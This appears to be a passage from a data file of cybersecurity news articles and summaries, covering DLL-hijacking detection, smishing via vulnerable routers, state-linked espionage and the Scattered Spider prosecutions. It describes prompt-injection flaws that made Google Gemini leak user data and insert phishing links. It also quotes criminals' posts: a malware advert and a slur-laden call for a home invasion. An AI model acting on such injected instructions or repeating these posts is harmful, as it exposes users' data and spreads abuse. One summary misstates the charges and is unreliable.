size.Third-generation model diagramComparison of the modelsTo evaluate the evolution of our models, we applied them to a test data set none of them had worked with before. The graph below shows the ratio of true positive to false positive verdicts for each model.Trends in true positives and false positives from the first-, second-, and third-generation modelsAs the models evolved, the percentage of true positives grew. While the first-generation model achieved a relatively good result (0.6 or higher) only with a very high false positive rate (10⁻³or more), the second-generation model reached this at 10⁻⁵. The third-generation model, at the same low false positive rate, produced 0.8 true positives, which is considered a good result.Evaluating the models on the data stream at a fixed score shows that the absolute number of new events labeled as DLL Hijacking increased from one generation to the next. That said, evaluating the models by their false verdict rate also helps track progress: the first model has a fairly high error rate, while the second and third generations have significantly lower ones.False positives rate among model outputs, July 2024 – August 2025 (download)Practical application of the modelsAll three model generations are used in our internal systems to detect likely cases of DLL hijacking within telemetry data streams. We receive 6.5 million security events daily, linked to 800,000 unique files. Aggregates are built from this sample at a specified interval, enriched, and then fed into the models. The output data is then ranked by model and by the probability of DLL hijacking assigned to the event, and then sent to our analysts. For instance, if the third-generation model flags an event as DLL hijacking with high confidence, it should be investigated first, whereas a less definitive verdict from the first-generation model can be checked last.Simultaneously, the models are tested on a separate data stream they have not seen before. This is done to assess their effectiveness over time, as a model’s detection performance can degrade. The graph below shows that the percentage of correct detections varies slightly over time, but on average, the models detect 70–80% of DLL hijacking cases.DLL hijacking detection trends for all three models, October 2024 – September 2025 (download)Additionally, we recently deployed a DLL hijacking detection model into theKaspersky SIEM, but first we tested the model in theKaspersky MDRservice. During the pilot phase, the model helped to detect and prevent a number of DLL hijacking incidents in our clients’ systems. We have writtena separate articleabout how the machine learning model for detecting targeted attacks involving DLL hijacking works in Kaspersky SIEM and the incidents it has identified.ConclusionBased on the training and application of the three generations of models, the experiment to detect DLL hijacking using machine learning was a success. We were able to develop a model that distinguishes events resembling DLL hijacking from other events, and refined it to a state suitable for practical use, not only in our internal systems but also in commercial products. Currently, the models operate in the cloud, scanning hundreds of thousands of unique files per month and detecting thousands of files used in DLL hijacking attacks each month. They regularly identify previously unknown variations of these attacks. The results from the models are sent to analysts who verify them and create new detection rules based on their findings.",

She then attempted to launder her funds through an accomplice, Wen Jian, a 42 year old female who facilitated the purchase of property, jewellery and other high value assets on Qian’s behalf.Qian Zhimin (left) and Wen Jian (right) (Source)In 2018, authorities seized a number of digital devices from Qian and Wen’s London home, but it was not until 2021 that they realized the devices contained digital wallets holding 61,000Bitcoin, worth at that time around a billion dollars. Wen was subsequently arrested in 2022 andconvictedin 2024. Qian remained at large until her arrest in April 2024. Qian’s sentencing has been set for next month.What happens to the seized funds remains the subject of somecontroversysince the value of the Bitcoin now far exceeds that of the funds invested by victims. Both the UK government and representatives of the Chinese victims are seeking restitution.The Bad | Hackers Exploit Milesight Routers to Send Phishing SMS to UsersNewresearchsuggests thatmultiple threat actors may be leveraging an unpatched bug in Milesight cellular routers, targeting users in a number of different countries with SMS phishing messages (akaSmishing) since at least 2022. A patch for the flaw,CVE-2023-43261, was released in 2023, but analysis suggests many unpatched devices remain accessible from the public internet.The researchers say that attackers have been exploiting the vulnerable routers to send large volumes of SMS messages mimicking government services, banks and delivery companies. Victims receive legitimate looking texts urging them to click malicious links, which redirect to mobile-optimized phishing pages.The attack is made possible as the flaw allows anyone to access log messages on the exposed routers via API calls. The logs contain encrypted administrator credentials which attackers can decrypt usinghardcoded AES keysfound in the client-side JavaScript and then use these credentials to authenticate further API calls.The researchers also believe other bugs may be in play as they noted evidence that many exposed devices were running outdated firmware with other known vulnerabilities.Analysis of the targeted phone numbers indicates that Europe is the primary region affected by thesmishingcampaigns, with Belgium heavily targeted; however, vulnerable devices were also observed in Australia, Turkey, Singapore and even North America. In one of a number of campaigns, SMS lures using the domaindisney[.]plus-billing[.]sbsand referencing a payment issue urged recipients to click a malicious link.Phishing messagesin several languages, including French, Italian and English, were observed.The researchers believe multiple campaigns have been in operation by different threat actor groups targeting the same vulnerable infrastructure.Examples of malicious SMS messages (Source: Sekoia)Vulnerable cellular routers offer an attractive target to threat actors, affording them the ability to send messages at scale without being flagged as malicious. Individuals and businesses are reminded that, as with other forms ofphishing, heightened awareness and scepticism towards unsolicited SMS messages, even when they appear to come from trusted sources, is a vital first line of defense.The Ugly | Trio of Flaws in Google Gemini Turn AI Into Attack VehicleAI is in the spotlight again this week withnewsthatseveral products within Google’s family of AI models were vulnerable to search injection attacks, prompt injection attacks and exfiltration of user data, leading researchers to dub the flaws the ‘Gemini Trifecta’.The flaws were found inGoogle Cloud Platform’sGemini Cloud Assist, Gemini Search Personalization, and Gemini Browsing Tool, and serve as a reminder of therisks that AI bringsto enteprises as threat actors look to manipulate such tools in their attacks. The researchers say they discovered three distinct components in the Gemini suite that had issues:Gemini Cloud Assist— This prompt-injection vulnerability in Google Cloud’s Gemini Cloud Assist tool could have enabled attackers to exploit cloud-based services, potentially compromising cloud resources, and also could have allowed phishing attempts. This vulnerability represents a new attack class in the cloud and in general, where log injections can poison AI inputs with arbitrary prompt injectionsGemini Search Personalization Model— This search-injection vulnerability gave attackers the ability to inject prompts, control Gemini’s behavior and potentially leak the user’s saved information and location data by manipulating their Chrome search historyGemini Browsing Tool— This flaw allowed attackers to exfiltrate a user’s saved information and location data by abusing the browsing tool, potentially putting user privacy at risk.Gemini rendered the attacker’s message and inserted the phishing link into its log summary (Source: Tenable)The vulnerabilities were reported to Google and have now been patched. However, it is important that enterprises view AI assistants not just aspassive productivity toolsbut asactive attack surfacesand treat them accordingly.",

But the “everywhere workplace” quickly became permanent because employees and organizations realized the flexibility and productivity gains were too valuable to give up.\nWe’re at a similar inflection point now with the rise of agentic workspaces—AI-driven environments where autonomous digital assistants don’t just fetch information but actually act on behalf of employees. These agents are scheduling meetings, drafting documents, analyzing conversations and negotiating workflows across platforms. Work isn’t just faster; in some cases, it feels like it’s running itself.\nThat’s exciting, but it also raises a familiar concern. When something feels seamless, it’s usually because complexity—and risk—is being hidden.\nA New Security Blind Spot\nAgentic workspaces are powerful, but they’re also opaque.\nIf an AI agent summarizes a confidential meeting, where is that data stored? If it drafts a legal or financial analysis, who else can access the context behind it? Without visibility into these flows, organizations are trusting processes they can’t fully see.\nIt reminds me a little of the double-edged sword of QR codes. They exploded during the pandemic as a frictionless way to access menus or pay bills. But that very simplicity masks a serious risk: people have been conditioned to trust QR codes without knowing where they actually lead. Agentic workspaces carry the same dynamic. The convenience is undeniable, but the trust is often blind.\nMORE FOR YOU\nScott Crawford\n, head of information security research at 451 Research / S&P Global, breaks down why this blind spot is different from past challenges: “Agentic AI is distinguished by three primary capabilities: the modeling of reasoning based on inputs and available memory context; the ability to make decisions; and the taking of actions, often using tools. Given sufficient confidence in deployments, the ideal is for agents to operate with a high degree of autonomy. But these factors introduce new aspects of risk. The non-deterministic nature of agentic actions may make it more difficult for organizations to define constraints that mitigate those risks.”\nThat unpredictability makes visibility and guardrails essential—and explains why security vendors are racing to address it.\nProofpoint’s Industry-First Approach\nA\nblog post\nfrom Proofpoint CEO\nSumit Dhawan\nlays out a coherent strategy for collaboration and data security challenges in the emerging agentic workspace, and outlines a number of solutions and partnerships from Proofpoint to enable it.\nProofpoint is the first major security vendor to\nannounce a solution explicitly designed for this new environment\n. Rather than layering more controls on endpoints or networks, they’re embedding security directly into the flow of conversations, documents and AI-driven actions.\nThis matters because in an agentic workspace, the “user” isn’t always a person. It’s an autonomous agent making decisions on behalf of a person. Traditional security controls were never built for that scenario. By extending visibility and protections into these workflows, Proofpoint is aiming to safeguard both collaboration and the sensitive data being exchanged.\nLessons From the Everywhere Workplace\nThe parallels to the pandemic-driven workplace shift are striking. Surveys showed that 87% of workers never wanted to return to the office full-time, and many were even willing to trade compensation for flexibility. Leaders who assumed the change was temporary were caught unprepared.\nAgentic workspaces are on a similar trajectory. Once employees experience the productivity gains of offloading repetitive tasks to AI, there will be no turning back. Organizations that treat it as a short-lived experiment risk being blindsided again—this time by security gaps.\nWhere the Real Risks Will Emerge\nTodd Thiemann\n, principal analyst at Omdia, points out that many current AI agent deployments are happening within SaaS applications like Salesforce Agentforce, Workday agents and Microsoft’s Security Copilot. These “walled gardens” offer some safety because vendors control authentication and authorization. But the real challenge will come when agents start interacting directly with applications, where they can access more sensitive systems and data.\nThiemann warns, “The real value for agentic AI will come when agents start touching core enterprise applications. That is where enterprises will unlock significant AI value, but also encounter significant security risk from AI agents. Agentic AI dramatically expands the enterprise attack surface and requires new security tooling to mitigate that risk.”\nThat risk is compounded by the speed of adoption. Enterprises are investing heavily in agentic AI, often rushing pilots into production to demonstrate ROI. Security is typically an afterthought. Over-permissioned agents or weak guardrails could quickly lead to incidents such as data breaches or fraud. Thiemann believes it may take a high-profile security failure to push organizations into tightening controls.\nWhy It Resonates\nI’ve written for years about technologies that promise to make life easier but introduce new risks. New technologies typically follow a familiar pattern. We embrace the benefits quickly, but security usually lags behind. Proofpoint’s announcement feels like an attempt to break that cycle by building guardrails into agentic workspaces from the start.\nCrawford made the point clearly: “There’s no time like the present for vendors to play a leading role in helping organizations find workable ways to contain those risks and help agentic functionality fulfill its promise.” Proofpoint is stepping into that role, and others are likely to follow.\nThe Road Ahead\nAgentic AI isn’t a fad—it’s the logical next step in automation. We’ve moved from macros to chatbots to agents that adapt, decide and act. That shift makes securing the data layer, not just the perimeter, essential.\nIf history is any guide, standards and best practices will eventually emerge to define how agentic workspaces should be secured. But for now, organizations can’t afford to wait. The vendors and enterprises that move early will shape those guardrails—and give themselves a head start in keeping this new era of work safe.\nEditorial Standards\nReprints & Permissions",

The UK’s National Crime Agency (NCA) says the investigation remains at an early stage and is ongoing. The man has been released on bail pending further enquiries.The Bad | DPRK Threat Actor Groups Collaborate to Weaponize Developer IdentitiesResearchers atESEThave this week offered further evidence that distinct DPRK threat actor groups responsible for theContagious Interviewcampaign and the DPRKFraudulent IT Workercampaign are likely working in concert, using identities stolen from the former to feed the recruitment drive of the latter.Detailing the activities of a threat actor they call DeceptiveDevelopment, broadly overlapping those of Contagious Interview, the researchers say they uncovered new links between the two campaigns. DeceptiveDevelopment operators use LinkedIn and other social media platforms to pose as recruiters, using fraudulent job offers to lure job seekers and compromise their computers.Meanwhile, operators running IT worker scams use the information stolen by DeceptiveDevelopment operators to pose as job seekers with companies they wish to infiltrate. The researchers say the fake IT workers initially targeted jobs in the U.S. but have now shifted to European countries such as France, Poland, and Ukraine.While DeceptiveDevelopment focuses on malware, OSINT shows ties to North Korean IT workers who use fake identities to secure remote jobs, thus surreptitiously funding North Korean state operations. 5/6— ESET Research (@esetresearch.bsky.social)25 September 2025 at 10:24Through an analysis of OSINT data and other research, ESET says the fake IT workers are organized into teams with members working between 10-16 hours per day, pursuing job opportunities, completing tasks and undertaking studies in topics such as web programming, blockchain, AI and English language. The members also use prepared scripts to try and recruit proxies in target countries who would be willing to attend interviews or run laptop farms.The scale of the DPRK’s activities to infect job seekers and their potential or current employers as well as to use stolen data to infiltrate companies as fraudulent workers has surprised security researchers. The threat presents a different challenge to simply detecting and preventing isolated campaigns and underscores the need for security teams and recruitment teams todevelop workflowsthat can identify fraudulent applications. At the same time, enterprises are urged to ensure they lockdown their internal resources with atrusted security platformthat can prevent both intrusions and insider threats.The Ugly | China-Linked Threat Actor Drops Malware on Edge Devices That Sleeps for Over a YearChina-linked threat actors have been targeting U.S. firms in the tech and legal sectors with a stealthy backdoor known as BRICKSTORM, likely with the aim of infecting a broader range of downstream victims and feeding development of new zero days, Google’s Threat Intelligence Group (GTIG) hassaidthis week.Attributing the activity to UNC5221, GTIG said the threat cluster was distinct from the widely-reported activities ofSilk Typhoon, named as responsible for a number of attacks on U.S. interests earlier this year. UNC5221’s activities are specifically focused on obtaining and maintaining long-term access via backdoors on appliances and network edge devices that typically cannot support endpoint security software due to limited processor power, memory and storage space.The researchers said initial access was difficult to determine due tothe lengthy dwell time between infection and attack, on average 393 days, which often exceeded log retention periods. However, in one case, it was determined that the intrusion leveraged a security flaw in Ivanti Connect Secure devices to obtain initial access.Having gained a foothold, UNC5221 deploy a Linux/BSD malware known as BRICKSTORM, a Go-based backdoor, to a network appliance before pivoting to VMware vCenter and ESXi hosts, using valid credentials captured from the network appliance.Source: GTIGGTIG said a common theme across incidents was the threat actor’s interest in emails of key individuals within the victim organization, in particular those of developers and system administrators. The attackers used Microsoft’sEntra ID Enterprise Applicationswithmail.readandfull_access_as_appscopes to gain access to every mailbox.Hunting for BRICKSTORM creates challenges for defenders as the malware typically resides on devices that lack EDR telemetry. Google has released ascanner toolto help search for known samples, along with comprehensive advice for threat hunting and hardening of devices.",

The charges came as Jubair and an alleged co-conspirator appeared in a London court to face accusations of hacking into and extorting several large U.K. retailers, the London transit system, and healthcare providers in the United States.At a court hearing last week, U.K. prosecutors laid out a litany of charges against Jubair and 18-year-oldOwen Flowers, accusing the teens of involvement in an August 2024 cyberattack that crippledTransport for London, the entity responsible for the public transport network in the Greater London area.A court artist sketch of Owen Flowers (left) and Thalha Jubair appearing at Westminster Magistrates’ Court last week. Credit: Elizabeth Cook, PA Wire.On July 10, 2025, KrebsOnSecurityreportedthat Flowers and Jubair had been arrested in the United Kingdom in connection with recent Scattered Spiderransom attacksagainst the retailersMarks & SpencerandHarrods, and the British food retailerCo-op Group.That story cited sources close to the investigation saying Flowers was the Scattered Spider member who anonymously gave interviews to the media in the days after the group’s September 2023 ransomware attacks disrupted operations at Las Vegas casinos operated byMGM ResortsandCaesars Entertainment.The story also noted that Jubair’s alleged handles on cybercrime-focused Telegram channels had far lengthier rap sheets involving some of the more consequential and headline-grabbing data breaches over the past four years. What follows is an account of cybercrime activities that prosecutors have attributed to Jubair’s alleged hacker handles, as told by those accounts in posts to public Telegram channels that are closely monitored by multiple cyber intelligence firms.EARLY DAYS (2021-2022)Jubair is alleged to have been a core member of theLAPSUS$cybercrime group thatbroke into dozens of technology companies beginning in late 2021, stealing source code and other internal data from tech giants includingMicrosoft,Nvidia,Okta,Rockstar Games,Samsung,T-Mobile, andUber.That is, according to the former leader of the now-defunct LAPSUS$. In April 2022, KrebsOnSecuritypublished internal chat recordstaken from a server that LAPSUS$ used, and those chats indicate Jubair was working with the group using the nicknamesAmtrakandAsyntax. In the middle of the gang’s cybercrime spree, Asyntax told the LAPSUS$ leader not to share T-Mobile’s logo in images sent to the group because he’d been previously busted for SIM-swapping and his parents would suspect he was back at it again.The leader of LAPSUS$ responded by gleefully posting Asyntax’s real name, phone number, and other hacker handles into a public chat room on Telegram:In March 2022, the leader of the LAPSUS$ data extortion group exposed Thalha Jubair’s name and hacker handles in a public chat room on Telegram.That story about the leaked LAPSUS$ chats also connected Amtrak/Asyntax to several previous hacker identities, including “Everlynn,” who in April 2021 began offering a cybercriminal service thatsold fraudulent “emergency data requests”targeting the major social media and email providers.In these so-called “fake EDR” schemes, the hackers compromise email accounts tied to police departments and government agencies, and then send unauthorized demands for subscriber data (e.g. username, IP/email address), while claiming the information being requested can’t wait for a court order because it relates to an urgent matter of life and death.The roster of the now-defunct “Infinity Recursion” hacking team, which sold fake EDRs between 2021 and 2022. The founder “Everlynn” has been tied to Jubair. The member listed as “Peter” became the leader of LAPSUS$ who would later post Jubair’s name, phone number and hacker handles into LAPSUS$’s chat channel.EARTHTOSTARProsecutors in New Jersey last weekallegedJubair was part of a threat group variously known as Scattered Spider,0ktapus, andUNC3944, and that he used the nicknamesEarthtoStar,Brad,Austin, andAustistic.Beginning in 2022, EarthtoStar co-ran a bustling Telegram channel calledStar Chat, which was home to a prolific SIM-swapping group that relentlessly used voice- and SMS-based phishing attacks to steal credentials from employees at the major wireless providers in the U.S. and U.K.Jubair allegedly used the handle “Earth2Star,” a core member of a prolific SIM-swapping group operating in 2022. This ad produced by the group lists various prices for SIM swaps.The group would then use that access to sell a SIM-swapping service that could redirect a target’s phone number to a device the attackers controlled, allowing them to intercept the victim’s phone calls and text messages (including one-time codes). Members of Star Chat targeted multiple wireless carriers with SIM-swapping attacks, but they focused mainly on phishing T-Mobile employees.In February 2023, KrebsOnSecurity scrutinized more than seven months of these SIM-swapping solicitations on Star Chat, which almost daily peppered the public channel with “Tmo up!” and “Tmo down!” notices indicating periods wherein the group claimed to have active access to T-Mobile’s network.A redacted receipt from Star Chat’s SIM-swapping service targeting a T-Mobile customer after the group gained access to internal T-Mobile employee tools.The data showed that Star Chat — along with two other SIM-swapping groups operating at the same time —collectively broke into T-Mobile over a hundred times in the last seven months of 2022. However, Star Chat was by far the most prolific of the three, responsible for at least 70 of those incidents.The 104 days in the latter half of 2022 in which different known SIM-swapping groups claimed access to T-Mobile employee tools. Star Chat was responsible for a majority of these incidents. Image: krebsonsecurity.com.A review of EarthtoStar’s messages on Star Chat as indexed by the threat intelligence firmFlashpointshows this person also sold “AT&T email resets” and AT&T call forwarding services for up to $1,200 per line. EarthtoStar explained the purpose of this service in post on Telegram:“Ok people are confused, so you know when u login to chase and it says ‘2fa required’ or whatever the fuck, well it gives you two options, SMS or Call. If you press call, and I forward the line to you then who do you think will get said call?”New Jersey prosecutors allege Jubair also was involved in amass SMS phishing campaign during the summer of 2022that stole single sign-on credentials from employees at hundreds of companies. The text messages asked users to click a link and log in at a phishing page that mimicked their employer’sOktaauthentication page, saying recipients needed to review pending changes to their upcoming work schedules.The phishing websites used a Telegram instant message bot to forward any submitted credentials in real-time, allowing the attackers to use the phished username, password and one-time code to log in as that employee at the real employer website.That weeks-long SMS phishing campaign led to intrusions and data thefts at more than 130 organizations, includingLastPass,DoorDash,Mailchimp,PlexandSignal.A visual depiction of the attacks by the SMS phishing group known as 0ktapus, ScatterSwine, and Scattered Spider.

In May 2022, EarthtoStar posted to the Telegram channel “Frauwudchat”:“Hi, I am looking for partners in order to exfiltrate data from large telecommunications companies/call centers/alike, I have major experience in this field, [including] a massive call center which houses 200,000+ employees where I have dumped all user credentials and gained access to the [domain controller] + obtained global administrator I also have experience with REST API’s and programming. I have extensive experience with VPN, Citrix, cisco anyconnect, social engineering + privilege escalation. If you have any Citrix/Cisco VPN or any other useful things please message me and lets work.”At around the same time in the Summer of 2022, at least two different accounts tied to Star Chat — “RocketAce” and “Lopiu” — introduced the group’s services to denizens of the Russian-language cybercrime forumExploit, including:-SIM-swapping services targeting Verizon and T-Mobile customers;-Dynamic phishing pages targeting customers of single sign-on providers like Okta;-Malware development services;-The sale of extended validation (EV) code signing certificates.The user “Lopiu” on the Russian cybercrime forum Exploit advertised many of the same unique services offered by EarthtoStar and other Star Chat members. Image source: ke-la.com.These two accounts on Exploit created multiple sales threads in which they claimed administrative access to U.S. telecommunications providers and asked other Exploit members for help in monetizing that access. In June 2022, RocketAce, which appears to have been just one of EarthtoStar’s many aliases, posted to Exploit:Hello. I have access to a telecommunications company’s citrix and vpn. I would like someone to help me break out of the system and potentially attack the domain controller so all logins can be extracted we can discuss payment and things leave your telegram in the comments or private message me ! Looking for someone with knowledge in citrix/privilege escalationOn Nov. 15, 2022, EarthtoStar posted to theirStar SanctuaryTelegram channel that they were hiring malware developers with a minimum of three years of experience and the ability to develop rootkits, backdoors and malware loaders.“Optional: Endorsed by advanced APT Groups (e.g. Conti, Ryuk),” the ad concluded, referencing two of Russia’s most rapacious and destructive ransomware affiliate operations. “Part of a nation-state / ex-3l (3 letter-agency).”2023-PRESENT DAYThe Telegram and Discord chat channels wherein Flowers and Jubair allegedly planned and executed their extortion attacks are part of a loose-knit network known as theCom, an English-speaking cybercrime community consisting mostly of individuals living in the United States, the United Kingdom, Canada and Australia.Many of these Com chat servers have hundreds to thousands of members each, and some of the more interesting solicitations on these communities are job offers for in-person assignments and tasks that can be found if one searches for posts titled, “If you live near,” or “IRL job” — short for “in real life” job.These “violence-as-a-service” solicitations typically involve “brickings,” where someone is hired to toss a brick through the window at a specified address. Other IRL jobs for hire include tire-stabbings, molotov cocktail hurlings, drive-by shootings, and even home invasions. The people targeted by these services are typically other criminals within the community, but it’s not unusual to see Com members asking others for help in harassing or intimidating security researchers and even the very law enforcement officers who are investigating their alleged crimes.It remains unclear what precipitated this incident or what followed directly after, but on January 13, 2023, a Star Sanctuary account used by EarthtoStar solicited the home invasion of a sitting U.S. federal prosecutor from New York. That post included a photo of the prosecutor taken from the Justice Department’s website, along with the message:“Need irl niggas, in home hostage shit no fucking pussies no skinny glock holding 100 pound niggas either”Throughout late 2022 and early 2023, EarthtoStar’s alias “Brad” (a.k.a. “Brad_banned”) frequently advertised Star Chat’s malware development services, including custom malicious software designed to hide the attacker’s presence on a victim machine:We can develop KERNEL malware which will achieve persistence for a long time,bypass firewalls and have reverse shell access.This shit is literally like STAGE 4 CANCER FOR COMPUTERS!!!Kernel meaning the highest level of authority on a machine.This can range to simple shells to Bootkits.Bypass all major EDR’s (SentinelOne, CrowdStrike, etc)Patch EDR’s scanning functionality so it’s rendered useless!Once implanted, extremely difficult to remove (basically impossible to even find)Development Experience of several years and in multiple APT Groups.Be one step ahead of the game. Prices start from $5,000+. Message @brad_banned to get a quoteIn September 2023 , both MGM Resorts and Caesars Entertainment suffered ransomware attacks at the hands of a Russian ransomware affiliate program known asALPHVandBlackCat. Caesarsreportedly paid a $15 million ransomin that incident.Within hours of MGM publicly acknowledging the 2023 breach, members of Scattered Spider were claiming credit and telling reporters they’d broken in by social engineering a third-party IT vendor. At a hearing in London last week, U.K. prosecutors told the court Jubair was found in possession of more than $50 million in ill-gotten cryptocurrency, including funds that were linked to the Las Vegas casino hacks.The Star Chat channel was finally banned by Telegram on March 9, 2025. But U.S. prosecutors say Jubair and fellow Scattered Spider members continued their hacking, phishing and extortion activities up until September 2025.In April 2025, the Com was buzzing about the publication of “The Com Cast,” a lengthy screed detailing Jubair’s alleged cybercriminal activities and nicknames over the years. This account included photos and voice recordings allegedly of Jubair, and asserted that in his early days on the Com Jubair used the nicknames Clark and Miku (these are both aliases used by Everlynn in connection with their fake EDR services).Thalha Jubair (right), without his large-rimmed glasses, in an undated photo posted in The Com Cast.More recently, the anonymous Com Cast author(s) claimed, Jubair had used the nickname “Operator,” which corresponds to a Com member who ran an automated Telegram-based doxing service that pulled consumer records from hacked data broker accounts. That public outing came after Operator allegedly seized control over theDoxbin, a long-running and highly toxic community that is used to “dox” or post deeply personal information on people.“Operator/Clark/Miku: A key member of the ransomware group Scattered Spider, which consists of a diverse mix of individuals involved in SIM swapping and phishing,” the Com Cast account stated. “The group is an amalgamation of several key organizations, including Infinity Recursion (owned by Operator), True Alcorians (owned by earth2star), and Lapsus, which have come together to form a single collective.”The New Jerseycomplaint(PDF) alleges Jubair and other Scattered Spider members committed computer fraud, wire fraud, and money laundering in relation to at least 120 computer network intrusions involving 47 U.S. entities between May 2022 and September 2025. The complaint alleges the group’s victims paid at least $115 million in ransom payments.U.S. authorities say they traced some of those payments to Scattered Spider to an Internet server controlled by Jubair. The complaint states that a cryptocurrency wallet discovered on that server was used to purchase several gift cards, one of which was used at a food delivery company to send food to his apartment. Another gift card purchased with cryptocurrency from the same server was allegedly used to fund online gaming accounts under Jubair’s name. U.S. prosecutors said that when they seized that server they also seized $36 million in cryptocurrency.The complaint also charges Jubair with involvement in a hacking incident in January 2025 against the U.S. courts system that targeted a U.S. magistrate judge overseeing a related Scattered Spider investigation. That other investigation appears to have been the prosecution ofNoah Michael Urban, a 20-year-old Florida mancharged in November 2024 by prosecutors in Los Angelesas one of five alleged Scattered Spider members.Urban pleaded guilty in April 2025 to wire fraud and conspiracy charges, and in August he was sentenced to 10 years in federal prison. Speaking with KrebsOnSecurity from jail after his sentencing, Urban asserted that the judge gave him more time than prosecutors requested becausehe was mad that Scattered Spider hacked his email account.Noah “Kingbob” Urban, posting to Twitter/X around the time of his sentencing on Aug. 20.Acourt transcript(PDF) from a status hearing in February 2025 shows Urban was telling the truth about the hacking incident that happened while he was in federal custody. The judge told attorneys for both sides that a co-defendant in the California case was trying to find out about Mr. Urban’s activity in the Florida case, and that the hacker accessed the account by impersonating a judge over the phone and requesting a password reset.Allison Nixonis chief research officer at the New York based security firmUnit 221B, and easily one of the world’s leading experts on Com-based cybercrime activity. Nixon said the core problem with legally prosecuting well-known cybercriminals from the Com has traditionally been that the top offenders tend to be under the age of 18, and thus difficult to charge under federal hacking statutes.In the United States, prosecutors typically wait until an underage cybercrime suspect becomes an adult to charge them. But until that day comes, she said, Com actors often feel emboldened to continue committing — and very often bragging about — serious cybercrime offenses.“Here we have a special category of Com offenders that effectively enjoy legal immunity,” Nixon told KrebsOnSecurity. “Most get recruited to Com groups when they are older, but of those that join very young, such as 12 or 13, they seem to be the most dangerous because at that age they have no grounding in reality and so much longevity before they exit their legal immunity.”Nixon said U.K. authorities face the same challenge when they briefly detain and search the homes of underage Com suspects: Namely, the teen suspects simply go right back to their respective cliques in the Com and start robbing and hurting people again the minute they’re released.Indeed, the U.K. court heard from prosecutors last week that both Scattered Spider suspects were detained and/or searched by local law enforcement on multiple occasions, only to return to the Com less than 24 hours after being released each time.“What we see is these young Com members become vectors for perpetrators to commit enormously harmful acts and even child abuse,” Nixon said. “The members of this special category of people who enjoy legal immunity are meeting up with foreign nationals and conducting these sometimes heinous acts at their behest.”Nixon said many of these individuals have few friends in real life because they spend virtually all of their waking hours on Com channels, and so their entire sense of identity, community and self-worth gets wrapped up in their involvement with these online gangs. She said if the law was such that prosecutors could treat these people commensurate with the amount of harm they cause society, that would probably clear up a lot of this problem.“If law enforcement was allowed to keep them in jail, they would quit reoffending,” she said.The Times of Londonreportsthat Flowers is facing three charges under the Computer Misuse Act: two of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of attempting to commit the same act. Maximum sentences for these offenses can range from 14 years to life in prison, depending on the impact of the crime.Jubair is reportedly facing two charges in the U.K.: One of conspiracy to commit an unauthorized act in relation to a computer causing/creating risk of serious damage to human welfare/national security and one of failing to comply with a section 49 notice to disclose the key to protected information.In the United States, Jubair is charged with computer fraud conspiracy, two counts of computer fraud, wire fraud conspiracy, two counts of wire fraud, and money laundering conspiracy. If extradited to the U.S., tried and convicted on all charges, he faces a maximum penalty of 95 years in prison.In July 2025, the United Kingdom barred victims of hacking from paying ransoms to cybercriminal groups unless approved by officials. U.K. organizations that are considered part of critical infrastructurereportedlywill face a complete ban, as will the entire public sector. U.K. victims of a hack are now required to notify officials to better inform policymakers on the scale of Britain’s ransomware problem.For further reading (bless you), check outBloomberg’s poignant storylast week based on a year’s worth of jailhouse interviews with convicted Scattered Spider member Noah Urban.",
      "summary": "The 'Scattered Spider' duo, Thalha Jubair and Owen Flowers, has been charged by U.S. prosecutors for their alleged involvement in a series of cyber attacks that resulted in the extortion of at least $115 million from victims, primarily targeting retailers, the London transit system, and healthcare providers in the United States. This significant ransomware operation highlights the growing threat posed by young hackers to major corporations and public services. Jubair and Flowers are accused of being key members of Scattered Spider, a cybercrime group known for its prolific attacks on various sectors including technology giants like Microsoft, Nvidia, Okta, Rockstar Games, Samsung, T-Mobile, and Uber. Their activities extend beyond the United Kingdom to include SIM-swapping attacks targeting major wireless providers in both countries, as well as mass phishing campaigns that stole single sign-on credentials from hundreds of companies.",

      "content": "The Good | Federal Courts Crack Down on BreachForums & UNC3944 Cybercrime OperatorsConor Brian Fitzpatrick, the 22-year-old operator of the notorious BreachForums hacking site, has beenresentencedto three years in prisonafter a federal appeals court overturned his earlier punishment of time served and supervised release. Known online as “Pompompurin”, Fitzpatrick launched BreachForums in 2022 after the FBI dismantled RaidForums, quickly attracting more than 330,000 members.The site was a major hub for tradingdata stolenfrom telecom providers, healthcare companies, social networks, investment firms, and U.S. government agencies. Fitzpatrick was first arrested in March 2023 and pleaded guilty to being the site’s administrator. Prosecutors sought more than 15 years due to his violations of pretrial conditions, which included secretly using VPNs and unmonitored devices, but the court ultimately imposed a three-year prison term.Meanwhile, U.K. authorities have advanced their fight against hacking collectives. Two teenagers,18-year-old Owen Flowers of Walsall and 19-year-old Thalha Jubair of East London,were arrestedin connection with the August 2024 cyberattack on Transport for London (TfL). Both are believed to be members of theUNC3944collective, known most recently for targeting large organizations across multiple verticals.Courtroom sketch of Flowers and Jubair (Source: Elizabeth Cook/PA Media, Telegraph)Flowers faces additional charges for conspiring to breach U.S. healthcare providers, while Jubair has been charged in the U.S. with computer fraud, wire fraud, and money laundering tied to more than 120 global breaches that netted $115 million inransom. The TfL attack disrupted internal operations, delayed refunds, and exposed customer data includingnames, addresses, and contact details. Previous arrests in July linked UNC3944 tocyberattacks on major UK retailerssuch as Harrods and Marks & Spencer.The Bad | China-Linked TA415 Uses U.S.-China Trade Lures in Targeted Espionage CampaignsA Chinese state-sponsored threat actor known asTA415 has beenlinkedto a string ofspearphishingattacks against U.S. government entities, think tanks, and academic institutions in July and August. The campaign tailored its lures by using U.S.-China economic and trade topics, evenimpersonatingthe U.S.-China Business Council and the Chair of the House Select Committee on Strategic Competition to target individuals focused on relations and policy between the two nations.Emails appeared to invite recipients to closed-door briefings and were sent fromuschina@zohomail[.]com, with links to archives hosted on Zoho WorkDrive, Dropbox, and OpenDrive. These archives contained a decoy PDF and aWindows shortcut (LNK)file, which executed a batch script that deployed WhirlCoil, an obfuscated Python loader. The malware was able to establish persistence via scheduled tasks and openVisual Studio Code Remote Tunnelsto grant attackersbackdooraccess and enable arbitrary command execution.TA415 phishing emails (Source: Proofpoint)The collected data, including system information and user files, was exfiltrated through request logging services in base64-encoded HTTP POST requests. While early variants downloaded WhirlCoil components from Pastebin and Python.org, the infection chain has remained largely consistent since its first noted use in 2024 against aerospace, insurance, and manufacturing firms.The continued abuse of Visual Studio Code Remote Tunnels highlights the challenge for defenders: since the feature is legitimate, it blends into normal developer workflows, and is hard to detect without specific monitoring. Analysts note that TA415, which overlaps withAPT41, has gradually refined this technique over the past year, ramping up activity in recent months as U.S.-China trade negotiations intensify.The Ugly | Chaos Mesh Vulnerabilities Put Kubernetes at Risk of Full Cluster TakeoversResearchers haverevealedmultiple critical flaws 